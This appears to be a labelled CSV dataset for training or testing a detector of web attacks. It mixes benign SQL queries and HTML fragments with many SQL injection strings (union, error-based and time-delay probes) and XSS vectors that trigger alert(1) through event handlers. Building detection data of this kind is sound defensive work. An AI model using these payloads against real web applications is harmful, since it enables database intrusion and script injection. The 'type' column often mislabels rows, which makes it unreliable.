Text,Label,type
"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  # dyed",1,sql
select   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  select 0  )   end  )  --,1,sql
1  )   where 2930  =  2930,1,sql
"-8109%""   )    )    union all select 9089,9089--",1,sql
"   SELECT include, voice, ate FROM please WHERE can  IS NULL",0,sql
FROM  ( SELECT DISTINCT terrible FROM roar ) ,0,sql
"1'  )   union all select null,null,null,null,null,null#",1,xss
1'+  (  select 'dhcv' where 9372  =  9372,1,sql
 ,0,xss
SELECT * FROM apple WHERE Price NOT BETWEEN 10 AND 20,0,sql
	 </span> ,0,xss
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",1,sql
"-9532   )    )    union all select 6039,6039,6039,6039--",1,sql
98918059g,0,sql
"	 </span> </a> </i>&#93; </sup>.. In August 2019, the <a href=""/wiki/American_Institute_of_Certified_Public_Accountants"" title=""American Institute of Certified Public Accountants"">AICPA </a> introduced AI training course for accounting professionals.<sup id=""cite_ref-324"" class=""reference""><a href=""#cite_note-324"">&#91;313&#93; </a> </sup>",0,xss
"  SELECT quick,equator,child FROM press LEFT JOIN Orders ON increase.suggestID =  master.village ORDER BY route.tent",0,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  5037  =  5037",1,sql
"<li><a href=""/wiki/Physicalism"" title=""Physicalism"">Physicalism </a> </li>",0,xss
"  SELECT Orders.activityrID, Employees.pony, Employees.castle FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.underlineID ORDER BY Orders.breakfastID",0,sql
"1%'   )    )     )   union all select null,null,null--",1,sql
"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",1,xss
marc@probandoo.kg,0,sql
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1,sql
"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nelb'  =  'nelb",1,sql
 </li>,0,xss
SELECT AVG ( ants ) FROM go,0,sql
<label id=x tabindex=1 onactivate=alert(1)></label>,2,xss
telema,0,xss
"<style onkeyup=""alert(1)"" contenteditable>test</style>",2,xss
"   SELECT form, copy, sawFROM why WHERE fat  IS NOT NULL",0,xss
SELECT * FROM water WHERE author LIKE '%pour%',0,sql
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,xss
SELECT * FROM spring,0,xss
"<code onmouseenter=""alert(1)"">test</code>",2,xss
"<input onmouseup=""alert(1)"">test</input>",2,xss
"1'  )   as noqp where 4042  =  4042 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""hybu"" like ""hybu",1,xss
"<noembed onclick=""alert(1)"">test</noembed>",2,xss
"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
SELECT danger,0,sql
san bartolom,0,sql
	 </span> </h3>,0,xss
1   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   5281  =  5281,1,sql
SELECT * FROM wp_houzez_fields_builder order by id ASC,0,xss
"a=alert,a(1)",2,xss
"1' where 6902  =  6902 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
847,0,sql
SELECT dark ( s )  FROM read SELECT charge FROM cabin,0,xss
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,sql
"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""kvpy""  =  ""kvpy",1,sql
"  SELECT Orders.enginerID, Employees.necessary, Employees.mountain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.cameID ORDER BY Orders.everyoneID",0,sql
"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://en.wiktionary.org/wiki/artificial_intelligence"" class=""extiw"" title=""wikt:artificial intelligence"">Definitions </a> from Wiktionary ",0,xss
"<rb oncut=""alert(1)"" contenteditable>test</rb>",2,xss
15553,0,sql
"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'ujcx'  =  'ujcx",1,sql
"iif  (  1378  =  6569,1,1/0  )  ",1,sql
"-9845""  )   as xpis where 1936  =  1936 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,xss
anatoly,0,sql
admin' or 1  =  1--,1,sql
select   (  case when   (  6179  =  8476  )   then 6179 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
SELECT * FROM result ORDER BY moving DESC,0,sql
SELECT * FROM dark FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
-4384'   )    )     )   or 6872  =  6872 and    (    (     (  'ukhl'  =  'ukhl,1,xss
open3,0,sql
select case when 4176  =  6138 then 1 else null end--,1,sql
"  SELECT * FROM actually WHERE supply NOT IN  ( 'influence', 'happy', 'stems' )  ",0,xss
SELECT * FROM  ( SELECT shown FROM anything ) ,0,sql
<basefont onpointermove=alert(1)>XSS</basefont>,2,xss
"1""  )   as rnte where 6517  =  6517 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"1"" where 6785  =  6785 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
SELECT * FROM sound WHERE stove = 'empty' LIMIT 3,0,sql
shedd,0,sql
a2o2e5,0,sql
"-7806""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""vlrj"" like ""vlrj",1,xss
	 </span> </li>,0,xss
<animatetransform onpointermove=alert(1)>XSS</animatetransform>,2,xss
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",1,sql
"-6160'   )    )     )   or make_set  (  1924  =  4415,4415  )   and    (    (     (  'hayr'  =  'hayr",1,sql
mo3tren04,0,sql
      </div>,0,xss
SELECT * FROM correct WHERE mainly = 'gone' LIMIT 3,0,sql
"   SELECT suddenly, tropical, voyageFROM door WHERE tales  IS NOT NULL",0,xss
"<li><a href=""/wiki/Intertheoretic_reduction"" title=""Intertheoretic reduction"">Intertheoretic reduction </a> </li>",0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=A+Proposal+for+the+Dartmouth+Summer+Research+Project+on+Artificial+Intelligence&amp;rft.date=1955&amp;rft.aulast=McCarthy&amp;rft.aufirst=John&amp;rft.au=Minsky%2C+Marvin&amp;rft.au=Rochester%2C+Nathan&amp;rft.au=Shannon%2C+Claude&amp;rft_id=http%3A%2F%2Fwww-formal.stanford.edu%2Fjmc%2Fhistory%2Fdartmouth%2Fdartmouth.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"1""  )   as ucex where 5148  =  5148 order by 1#",1,xss
<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,2,xss
"INSERT INTO youth ( give, freedom, chosen, heavy, buried, how )  VALUES  ( 'blanket', 'satisfied'. whatever', 'half', 'yellow', 'exciting', 'signal' )  ",0,sql
-5352%'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  ',1,sql
"<style>@keyframes slidein {}</style><dd style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dd>",2,xss
"<blink ondblclick=""alert(1)"">test</blink>",2,xss
SELECT * FROM win WHERE silver = 'dance' FETCH FIRST 3 ROWS ONLY,0,sql
" end and    (    (   ""rqay"" like ""rqay",1,sql
SELECT * FROM one FETCH FIRST 3 ROWS ONLY,0,sql
1  )   as rqac where 3381  =  3381 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,sql
"1'  )   as ccee where 8880  =  8880 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",1,sql
"<li><a href=""/wiki/Pedro_Domingos"" title=""Pedro Domingos"">Domingos, Pedro </a>, ""Our Digital Doubles:  AI will serve our species, not control it"", <i><a href=""/wiki/Scientific_American"" title=""Scientific American"">Scientific American </a> </i>, vol. 319, no. 3 (September 2018), pp.&#160;88–93. </li>",0,xss
1'+  (  select 'qylf' where 6984  =  6984 and 2255  =  5094,1,sql
escocia 197,0,sql
"-8707'  )   union all select 5609,5609,5609--",1,sql
"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",1,xss
"1""  )   union all select null#",1,xss
" SELECT column_name ( s )  FROM magnet,cannot",0,sql
"<figcaption onmouseup=""alert(1)"">test</figcaption>",2,xss
"        <script src=""_static/js/tooltipster.bundle.min.js""></script>",0,xss
calle bendicion 160,0,sql
00505336a,0,sql
SELECT MIN ( tide )  AS thumb FROM straight,0,sql
"1',  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",1,xss
"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",1,sql
t45o0a35,0,sql
1i515s7d7d,0,sql
SELECT * FROM spread  WHERE curious = slow,0,sql
"<figure onmouseover=""alert(1)"">test</figure>",2,xss
"   SELECT COUNT ( here ) , silver FROM double BY toy",0,sql
"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",1,sql
	 </span>,0,xss
"1""  )   as kzuq where 4259  =  4259",1,xss
SELECT * FROM president,0,sql
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq",1,sql
"1 and make_set  (  6911  =  1867,1867  )  ",1,sql
"-1634%' union all select 5937,5937,5937,5937--",1,sql
"passatge credit, 93, 13-c",0,sql
"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",2,xss
DELETE FROM how,0,sql
37618946p,0,sql
recerdo,0,sql
5141,0,sql
SELECT * FROM three WHERE captured = 'actually' LIMIT 3,0,sql
"<style>@keyframes x{}</style><pre style=""animation-name:x"" onanimationstart=""alert(1)""></pre>",2,xss
chaila,0,sql
"1""  )   where 7548  =  7548",1,sql
"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1,xss
"<dd oncontextmenu=""alert(1)"">test</dd>",2,xss
SELECT * FROM lion WHERE cell = 'arrow' LIMIT 3,0,sql
SELECT * FROM limited FETCH FIRST 3 ROWS ONLY,0,sql
pascuet landivar,0,xss
"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/feed-exports.html"">Feed exports</a></li>",0,xss
1' where 8231  =  8231,1,sql
2161,0,sql
rajarshi,0,sql
declare @q nvarchar   (  4000  )   select @q   = ,1,xss
SELECT notice ( s )  FROM again SELECT group FROM however,0,sql
7u6can*i2a04n,0,sql
"-8002'   )    )     )   union all select 6647,6647,6647--",1,sql
SELECT hit ( s )  FROM smile FULL OUTER JOIN,0,sql
""" """,1,sql
coderch gordo,0,sql
SELECT AVG ( whom ) FROM having SELECT SUM ( sweet ) ,0,sql
"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",1,sql
"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""xjdh""  =  ""xjdh",1,sql
caamao alayo,0,sql
"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,sql
11800455y,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 416 )  ORDER BY meta_id ASC",0,sql
1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><samp id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></samp>",2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=74"" title=""Edit section: History of AI"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"	 </span> <span class=""reference-text""><cite class=""citation web"">Brooks, Rodney (10 November 2014). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20141112130954/http://www.rethinkrobotics.com/artificial-intelligence-tool-threat/"">""artificial intelligence is a tool, not a threat"" </a>. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.rethinkrobotics.com/artificial-intelligence-tool-threat/"">the original </a> on 12 November 2014. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=artificial+intelligence+is+a+tool%2C+not+a+threat&amp;rft.date=2014-11-10&amp;rft.aulast=Brooks&amp;rft.aufirst=Rodney&amp;rft_id=http%3A%2F%2Fwww.rethinkrobotics.com%2Fartificial-intelligence-tool-threat%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
03291016s,0,sql
"           <a href=""#"" class=""icon icon-home""> Scrapy",0,xss
SELECT Count ( * )  AS instant,0,sql
sineiro herranz,0,xss
select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,1,sql
"1   )    )    as debc where 7428  =  7428 union all select null,null,null#",1,sql
5.41816E+15,0,sql
"<li><cite id=""CITEREFLighthill1973"" class=""citation book""><a href=""/wiki/James_Lighthill"" title=""James Lighthill"">Lighthill, James </a> (1973). ""Artificial Intelligence: A General Survey"". <i>Artificial Intelligence: a paper symposium </i>. Science Research Council. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Artificial+Intelligence%3A+A+General+Survey&amp;rft.btitle=Artificial+Intelligence%3A+a+paper+symposium&amp;rft.pub=Science+Research+Council&amp;rft.date=1973&amp;rft.aulast=Lighthill&amp;rft.aufirst=James&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
15994230f,0,sql
SELECT * FROM wp_posts WHERE ID  =  262335 LIMIT 1,0,sql
SELECT * FROM case WHERE century NOT BETWEEN 'silk' AND 'guess',0,xss
"<font ondblclick=""alert(1)"">test</font>",2,xss
"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",1,sql
-8404   )    )    order by 1--,1,sql
"  SELECT moreID AS ID, studied AS social FROM movement",0,sql
"  SELECT SUBSTR ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;",0,xss
"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></small>",2,xss
<hr onpointerout=alert(1)>XSS</hr>,2,xss
"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,2,xss
"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
